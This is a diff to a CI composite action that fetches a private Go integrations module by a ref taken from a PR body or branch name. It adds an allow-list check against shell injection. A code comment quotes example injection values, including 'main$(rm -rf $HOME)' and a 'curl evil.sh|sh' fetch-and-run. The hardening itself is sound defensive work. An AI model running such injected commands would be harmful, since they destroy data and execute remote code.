@@ -91,11 +91,106 @@ runs:
       shell: bash
       env:
         INTEGRATION_REF: ${{ inputs.integration-ref }}
+        # head_ref is set on pull_request events (the PR branch name);
+        # empty on push events. We use it to auto-pair cross-repo
+        # feature branches that share a name between keploy and
+        # keploy/integrations.
+        GITHUB_HEAD_REF_VAL: ${{ github.head_ref }}
+        # PR body, used to discover an explicit `Integration-Ref:` tag
+        # for cross-repo PRs whose branch names don't match (the common
+        # case — keploy feature branches follow `feat/*` while
+        # integrations uses `<topic>-features` / etc.).
+        # Guard the pull_request.body access: this composite action
+        # runs from push and tag workflows too, where
+        # `github.event.pull_request` is null and the unguarded
+        # expression evaluates to an empty string with a noisy warning
+        # (or, on some runner versions, errors out). The short-circuit
+        # leaves PR_BODY empty for non-PR events; the bash/pwsh
+        # extractors below already treat empty as "no override".
+        PR_BODY: ${{ github.event_name == 'pull_request' && github.event.pull_request.body || '' }}
       run: |
         git config --global url."git@github.com:".insteadOf "https://github.com/"
 
-        echo "Fetching private integrations dependency via SSH..."
-        GOPRIVATE=github.com/keploy/integrations go get github.com/keploy/integrations@${INTEGRATION_REF}
+        # Cross-repo integrations-ref resolution order (first hit wins):
+        #
+        #   1. `Integration-Ref: <branch-or-sha>` line in the PR body —
+        #      explicit opt-in for cross-repo CI pairing. Case-insensitive
+        #      label so `INTEGRATION-REF:` / `integration-ref:` also
+        #      match. Anything up to whitespace/newline is the ref.
+        #   2. PR head branch name (github.head_ref) — auto-paired when
+        #      both repos use the same branch name for a feature.
+        #   3. The configured `integration-ref` input (wired from
+        #      vars.INTEGRATION_REF || 'main' at the workflow level).
+        #
+        # Each step runs `go get`; the first one to succeed short-
+        # circuits. Failures in (1) and (2) are swallowed — the
+        # authoritative fetch is (3), which propagates any real error.
+        FETCHED=0
+        # safe_ref_re — accept only the character set legal for git
+        # branch names, tags, commits, and Go module versions. The ref
+        # is derived from untrusted input (PR body, branch name), and
+        # although `go get` itself rejects shell metacharacters in the
+        # URL fragment the surrounding bash command still treats
+        # `${ref}` as a string to be interpolated; a value like
+        # "main$(rm -rf $HOME)" or "main; curl evil.sh|sh" would
+        # expand under the workflow's default IFS handling. Reject
+        # anything outside the allow-list before we let the value
+        # reach `go get`. The `+` is included so `+incompatible` Go
+        # module pseudo-versions (e.g. `v3.5.3+incompatible`) pass.
+        safe_ref_re='^[A-Za-z0-9._/+-]+$'
+        try_fetch() {
+          local ref="$1"
+          local source="$2"
+          [ -z "$ref" ] && return 1
+          [ "$ref" = "$INTEGRATION_REF" ] && return 1  # skip duplicate fetch
+          if ! [[ "$ref" =~ $safe_ref_re ]]; then
+            echo "  ✗ rejecting ref \"$ref\" (from $source): contains characters outside [A-Za-z0-9._/+-]; use a valid branch, tag, commit, or Go module version"
+            return 1
+          fi
+          echo "Trying integrations@${ref} (from ${source})"
+          if GOPRIVATE=github.com/keploy/integrations go get "github.com/keploy/integrations@${ref}" 2>/dev/null; then
+            echo "✓ Fetched integrations@${ref}"
+            FETCHED=1
+            return 0
+          fi
+          echo "  ✗ fetch failed for ${ref}; continuing"
+          return 1
+        }
+
+        # Step 1: PR body override.
+        # Tolerant matcher: accept the tag anywhere on a line — optional
+        # leading whitespace or a list marker ("- ", "* ", "> ") — and
+        # case-insensitive on both the "Integration" and "Ref" halves so
+        # common markdown rendering variants and hand-edited PR bodies
+        # still pair correctly. The trailing awk extracts only the
+        # FIRST whitespace-separated token after the colon — earlier
+        # iterations used `tr -d '[:space:]'` to strip trailing CR/LF,
+        # but that also concatenated "main other-tag" into
+        # "mainother-tag" if the author put two words on one line.
+        BODY_REF="$(printf '%s' "$PR_BODY" | grep -iE '^[[:space:]]*([-*>][[:space:]]+)?integration-ref:' | head -1 | sed -E 's/^[^:]+:[[:space:]]*//' | awk '{print $1; exit}' || true)"
+        if [ -n "$BODY_REF" ] && [ "$FETCHED" != "1" ]; then
+          try_fetch "$BODY_REF" "PR body Integration-Ref" || true
+        fi
+
+        # Step 2: head-branch auto-pair.
+        if [ "$FETCHED" != "1" ]; then
+          try_fetch "$GITHUB_HEAD_REF_VAL" "github.head_ref" || true
+        fi
+
+        # Step 3: authoritative fall-through. Propagates errors.
+        # INTEGRATION_REF originates from `vars.INTEGRATION_REF` (a
+        # workflow-level config value) rather than untrusted PR input,
+        # but apply the same allow-list as the dynamic refs above so a
+        # mis-set repo variable can't drive arbitrary command
+        # execution either.
+        if [ "$FETCHED" != "1" ]; then
+          if ! [[ "$INTEGRATION_REF" =~ $safe_ref_re ]]; then
+            echo "::error::INTEGRATION_REF \"$INTEGRATION_REF\" contains characters outside [A-Za-z0-9._/+-]; refusing to fetch"
+            exit 1
+          fi
+          echo "Fetching private integrations dependency via SSH (INTEGRATION_REF=${INTEGRATION_REF})..."
+          GOPRIVATE=github.com/keploy/integrations go get "github.com/keploy/integrations@${INTEGRATION_REF}"
+        fi
 
         echo "Creating extraparsers.go (platform-independent)..."
         mkdir -p pkg/agent/proxy
@@ -117,6 +212,15 @@ runs:
       shell: pwsh
       env:
         INTEGRATION_REF: ${{ inputs.integration-ref }}
+        GITHUB_HEAD_REF_VAL: ${{ github.head_ref }}
+        # Guard the pull_request.body access: this composite action
+        # runs from push and tag workflows too, where
+        # `github.event.pull_request` is null and the unguarded
+        # expression evaluates to an empty string with a noisy warning
+        # (or, on some runner versions, errors out). The short-circuit
+        # leaves PR_BODY empty for non-PR events; the bash/pwsh
+        # extractors below already treat empty as "no override".
+        PR_BODY: ${{ github.event_name == 'pull_request' && github.event.pull_request.body || '' }}
       run: |
         # Use per-run config when isolation is active, otherwise fall back to --global
         if ($env:GIT_CONFIG_GLOBAL) {
@@ -125,9 +229,67 @@ runs:
           git config --global url."git@github.com:".insteadOf "https://github.com/"
         }
 
-        Write-Host "Fetching private integrations dependency via SSH..."
         $env:GOPRIVATE = "github.com/keploy/integrations"
-        go get "github.com/keploy/integrations@${{ inputs.integration-ref }}"
+        $Fetched = $false
+        # Same allow-list as the bash step: refuse refs containing
+        # anything outside the git-branch / Go module version legal
+        # set so a malicious PR body can't smuggle pwsh metacharacters
+        # into the `go get` invocation. The `+` is included so
+        # `+incompatible` Go module pseudo-versions (e.g.
+        # `v3.5.3+incompatible`) pass on Windows just like on Linux.
+        $SafeRefRe = '^[A-Za-z0-9._/+-]+$'
+
+        function Try-Fetch([string]$Ref, [string]$Source) {
+          if ([string]::IsNullOrWhiteSpace($Ref)) { return $false }
+          if ($Ref -eq $env:INTEGRATION_REF) { return $false }
+          if ($Ref -notmatch $SafeRefRe) {
+            Write-Host "  rejecting ref '$Ref' (from $Source): contains characters outside [A-Za-z0-9._/+-]; use a valid branch, tag, commit, or Go module version"
+            return $false
+          }
+          Write-Host "Trying integrations@$Ref (from $Source)"
+          go get "github.com/keploy/integrations@$Ref" 2>$null
+          if ($LASTEXITCODE -eq 0) {
+            Write-Host "Fetched integrations@$Ref"
+            return $true
+          }
+          Write-Host "  fetch failed for $Ref; continuing"
+          return $false
+        }
+
+        # Resolution order: PR body Integration-Ref → head_ref → input.
+        # See the non-Windows step for the full rationale.
+        $BodyRef = $null
+        if ($env:PR_BODY) {
+          # Tolerant matcher: accept the tag with optional leading
+          # whitespace or a list marker ("- ", "* ", "> "), mirroring
+          # the non-Windows branch. Keeps the cross-repo pairing
+          # working when reviewers edit PR bodies by hand. Take only
+          # the FIRST whitespace-separated token after the colon —
+          # an earlier iteration stripped all whitespace, which would
+          # silently concatenate "main other-tag" into "mainother-tag"
+          # for two-word lines.
+          $line = ($env:PR_BODY -split "`n") | Where-Object { $_ -imatch '^\s*([-*>]\s+)?integration-ref\s*:' } | Select-Object -First 1
+          if ($line) {
+            $tail = $line -replace '^[^:]+:\s*', ''
+            $tokens = $tail -split '\s+', 2
+            if ($tokens.Length -gt 0 -and $tokens[0]) {
+              $BodyRef = $tokens[0]
+            }
+          }
+        }
+
+        if ($BodyRef) { $Fetched = Try-Fetch $BodyRef "PR body Integration-Ref" }
+        if (-not $Fetched) { $Fetched = Try-Fetch $env:GITHUB_HEAD_REF_VAL "github.head_ref" }
+
+        if (-not $Fetched) {
+          if ($env:INTEGRATION_REF -notmatch $SafeRefRe) {
+            Write-Host "::error::INTEGRATION_REF '$env:INTEGRATION_REF' contains characters outside [A-Za-z0-9._/+-]; refusing to fetch"
+            exit 1
+          }
+          Write-Host "Fetching private integrations dependency via SSH (INTEGRATION_REF=$env:INTEGRATION_REF)..."
+          go get "github.com/keploy/integrations@$env:INTEGRATION_REF"
+          if ($LASTEXITCODE -ne 0) { throw "go get failed for $env:INTEGRATION_REF" }
+        }
 
         Write-Host "Creating extraparsers.go..."
         New-Item -ItemType Directory -Path "pkg/agent/proxy" -Force | Out-Null
